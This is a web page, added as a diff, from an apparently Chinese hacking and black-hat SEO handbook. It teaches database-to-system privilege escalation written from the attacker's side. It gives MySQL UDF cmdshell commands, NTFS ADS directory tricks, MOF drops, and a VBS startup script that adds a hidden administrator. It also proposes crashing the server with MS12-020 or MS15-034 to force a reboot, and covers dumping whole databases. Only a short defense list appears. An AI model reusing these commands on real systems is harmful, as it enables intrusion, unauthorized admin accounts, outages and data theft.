@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Database Privilege Escalation - 数据库提权操作系统 | 烟雨黑帽</title>
+<meta name="description" content="数据库提权到操作系统 攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。 1️⃣Mysql数据库提权 一、如何获取mysql账号密码 当通过webshell进入服务器后，怎么得到数据库的账号密码呢 1. 查看网站配置文件。 如:conn、config、data、sql、co…">
+<meta name="keywords" content="Database Privilege Escalation, 数据库提权操作系统, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="noahs">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="Database Privilege Escalation">
+<meta property="og:description" content="数据库提权到操作系统 攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。 1️⃣Mysql数据库提权 一、如何获取mysql账号密码 当通过webshell进入服务器后，怎么得到数据库的账号密码呢 1. 查看网站配置文件。 如:conn、config、data、sql、co…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Database Privilege Escalation">
+<meta name="twitter:description" content="数据库提权到操作系统 攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。 1️⃣Mysql数据库提权 一、如何获取mysql账号密码 当通过webshell进入服务器后，怎么得到数据库的账号密码呢 1. 查看网站配置文件。 如:conn、config、data、sql、co…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "数据库提权操作系统"}]}, {"@type": "TechArticle", "headline": "Database Privilege Escalation", "alternativeHeadline": "数据库提权操作系统", "description": "数据库提权到操作系统 攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。 1️⃣Mysql数据库提权 一、如何获取mysql账号密码 当通过webshell进入服务器后，怎么得到数据库的账号密码呢 1. 查看网站配置文件。 如:conn、config、data、sql、co…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "noahs"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1 active"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>数据库提权操作系统</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>数据库提权操作系统</h1><p class="cn-title">Database Privilege Escalation</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#_1">数据库提权到操作系统</a><ul>
+<li><a href="#1mysql">1️⃣Mysql数据库提权</a><ul>
+<li><a href="#mysql">一、如何获取mysql账号密码</a></li>
+<li><a href="#udf">二、利用UDF自身提权</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#mysql_1">查找到mysql的目录后</a></li>
+<li><a href="#ntfs-adslib">利用NTFS ADS创建lib目录</a></li>
+<li><a href="#ntfs-adsplugin">利用NTFS ADS创建plugin目录</a><ul>
+<li><a href="#mof">三、利用mof提权</a></li>
+<li><a href="#mysql_2">四、通过Mysql把文件写入启动项</a></li>
+<li><a href="#2mssql">2️⃣微软Mssql提权</a></li>
+<li><a href="#3oracle">3️⃣如何通过Oracle提权</a></li>
+<li><a href="#4">4️⃣数据库安全防范</a></li>
+</ul>
+</li>
+<li><a href="#_2">数据库脱库</a><ul>
+<li><a href="#1">1️⃣工具脱库</a></li>
+<li><a href="#2">2️⃣脚本脱库</a></li>
+<li><a href="#3">3️⃣站点打包</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</details><div class="article-body"><h1 id="_1">数据库提权到操作系统</h1>
+<p>攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。</p>
+<h2 id="1mysql">1️⃣Mysql数据库提权</h2>
+<h3 id="mysql">一、如何获取mysql账号密码</h3>
+<p>当通过webshell进入服务器后，怎么得到数据库的账号密码呢</p>
+<ol>
+<li>查看网站配置文件。</li>
+</ol>
+<p>如:conn、config、data、sql、common 、inc等。</p>
+<ol start="2">
+<li>
+<p>查看数据库物理路径下的user表文件
+   目录为/data/mysql/user.myd和user.myi
+   密码是加密的，需要再次进行破解</p>
+</li>
+<li>
+<p>通过暴力破解得到（hscan、Bruter、hydra、脚本木马）
+   如果对外开放3306，即允许远程连接，可以远程爆破
+   补充：mysql开启root账号远程访问
+    <code>sql
+   mysql&gt; GRANT ALL PRIVILEGES ON*.*TO root@"%"IDENTIFIED BY"root";
+   mysql&gt; flush privileges;</code></p>
+</li>
+</ol>
+<h3 id="udf">二、利用UDF自身提权</h3>
+<hr />
+<ol>
+<li>原理
+   UDF提权是利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。</li>
+<li>利用条件
+   * 目标系统是Windows(Win2000,XP,Win2003)
+   * 已经拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数
+   * 有root账号和密码</li>
+</ol>
+<p><strong>利用方式A</strong></p>
+<ol>
+<li>使用工具“mysql综合利用工具”连接
+   填写地址、root账号、密码后进行连接</li>
+</ol>
+<p><img alt="mark" src="../images/a555447b2ddc8313.png" /></p>
+<ol start="2">
+<li>
+<p>导入udf.dll文件
+   连接成功后，导出DLL文件，导入时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），否则在下一步操作中你会看到"No paths allowed for shared library"错误。
+    <code>#不同版本mysql，udf.dll存放路径不同
+    #Mysql版本大于5.1版本。
+    xx\\mysql\\lib\\plugin\\udf.dll 文件夹下。
+    #Mysql5.1版本默认路径。
+    C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll
+    #Mysql版本小于5.1版本。
+    Windows2003下放置于c:\\windows\\system32\\udf.dll
+    windows2000下放置于c:\\winnt\\system32\\udf.dll</code>
+<strong>一般Lib、Plugin文件夹需要在webshell先手工建立（也可用NTFS ADS流模式突破进而创建文件夹）</strong></p>
+<p>```sql</p>
+<h1 id="mysql_1">查找到mysql的目录后</h1>
+<p>select @@basedir;</p>
+<h1 id="ntfs-adslib">利用NTFS ADS创建lib目录</h1>
+<p>select 'It is dll' into dumpfile 'C:\ProgramFiles\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION'; </p>
+<h1 id="ntfs-adsplugin">利用NTFS ADS创建plugin目录</h1>
+<p>select 'It is dll' into dumpfile 'C:\ProgramFiles\MySQL\MySQL Server 5.1\lib\plugin::$INDEX_ALLOCATION'; 
+```</p>
+</li>
+<li>
+<p>UDF提权常用命令:
+    <code>sql
+    #创建cmdshell函数，如果用3389就需要创建open3389函数，具体有哪些函数看帮助
+    create function cmdshell returns string soname 'udf.dll'; 
+    #创建好函数后，用函数执行系统命令
+    select cmdshell('net user');
+    select open3389();
+    drop function cmdshell; 删除函数
+    delete from mysql.func where name='cmdshell'  删除函数</code>
+    使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function 创建的函数名；</p>
+</li>
+</ol>
+<p><strong>利用方式B</strong></p>
+<p>UDF脚本提权,当mysql不能远程连接时，可以上传udf脚本至对方主机，然后通过webshell的方式进行连接操作。</p>
+<h3 id="mof">三、利用mof提权</h3>
+<p><strong>MOF漏洞工具与脚本实战：</strong> ***.com</p>
+<ol>
+<li>原理
+   在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要将要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</li>
+<li>利用条件
+   * mysql用户具有root权限
+   * 且可以复制文件到c:/windows/system32/wbem/mof/目录下
+   * 关闭了secure-file-priv</li>
+</ol>
+<p><strong>利用方式1</strong>
+通过工具如“mysql综合利用工具”直接提取，输入账户密码连接数据库后可直接输入系统命令，创建账号。</p>
+<p><strong>利用方式2</strong></p>
+<p>通过上传mof文件，然后在sql中运行的方式</p>
+<ol>
+<li>找个可写目录，上传mof文件</li>
+</ol>
+<p>假设上传的目录为文件夹<code>C:\\wmpub\\moon.mof</code>
+   该mof文件，已经写死了要创建的账号密码等信息</p>
+<ol start="2">
+<li>执行sql，转移文件到系统目录，等待创建新账号
+    <code>sql
+    select load_file('C:\\wmpub\\moon.mof') into dumpfile 'c:/windows/system32/wbem/mof/moon.mof';</code></li>
+<li>执行完后，验证账号
+    在webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了，注意新建的帐号每隔5分钟就会新建帐号，删除帐号的办法参考上文链接</li>
+</ol>
+<h3 id="mysql_2">四、通过Mysql把文件写入启动项</h3>
+<ol>
+<li>通过mysql数据库命令写入VBS脚本；
+    <code>sql
+    mysql&gt;drop database test1;
+    mysql&gt; create database test1;
+    mysql&gt; use test1;
+    mysql&gt; create table a (cmd text);
+    mysql&gt;insert into a values ("set wshshell=createobject (""wscript.shell"")");
+    mysql&gt;insert into a values ("a=wshshell.run (""cmd.exe /c net user best best /add"",0)");
+    mysql&gt;insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators best /add"",0)");
+    #注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序</code></li>
+</ol>
+<pre><code>2. 直接通过Webshell的Mysql写入启动项；
+    ```sql
+    mysql&gt;select * from a;
+    mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动//best.vbs&quot;;
+</code></pre>
+<ol start="3">
+<li>通过MS12-020、MS15-034重启服务器。
+   服务器down机后，管理员会重启，重启后我们就能得到新建的管理员账号了</li>
+</ol>
+<h2 id="2mssql">2️⃣微软Mssql提权</h2>
+<p>mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p>
+<p>通过漏洞拉到webshell之后，找到网站配置文件，里面有<strong>sa权限</strong>的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的，mssql一般是允许远程连接的，系统库是master。
+有了sa密码直接利用sqltools工具就可以了</p>
+<h2 id="3oracle">3️⃣如何通过Oracle提权</h2>
+<p>Oracle数据库一般与jsp、aspx网站搭配，如果是jsp网站，默认是系统权限，aspx网站默认需要提权。</p>
+<p><strong>提权方法参考：</strong>***.com工具为<code>oracleshell</code></p>
+<h2 id="4">4️⃣数据库安全防范</h2>
+<ol>
+<li>限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。</li>
+<li>不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。</li>
+<li>及时升级数据库补丁。</li>
+<li>安装Waf进行防御。</li>
+<li>购买数据库审计设备</li>
+</ol>
+<h1 id="_2">数据库脱库</h1>
+<h2 id="1">1️⃣工具脱库</h2>
+<p>通过百度查找Navicat Mysql、Navicat for SQL Server、Navicat for Oracle、Navicat for PostgreSQL、Navicat for SQLite等，也可以使用其它工具代替，如sqlmap、k8等类似工具。
+<strong>优点：</strong> 支持面广，功能强大，速度度、稳定
+<strong>缺点：</strong> 不能支持外链</p>
+<h2 id="2">2️⃣脚本脱库</h2>
+<p>通过百度查找ASP、PHP、JSP脱库脚本等类似工具。
+<strong>优点：</strong> 解决不外链的情况
+<strong>缺点：</strong> 速度慢、不够稳定</p>
+<h2 id="3">3️⃣站点打包</h2>
+<p>通过百度查找ASP、PHP、JSP脚本打包程序等类似工具。
+asp+access源码和数据库是可以一起打包，其它类型数据库，库与源码是单独分开的。 </p></div></article><nav class="pager"><a class="pg prev" href="../linux-privilege-escalation/"><span>上一篇</span><b>linux系统提权</b></a><a class="pg next" href="../internal-network-lateral-movement/"><span>下一篇</span><b>内网横向渗透</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
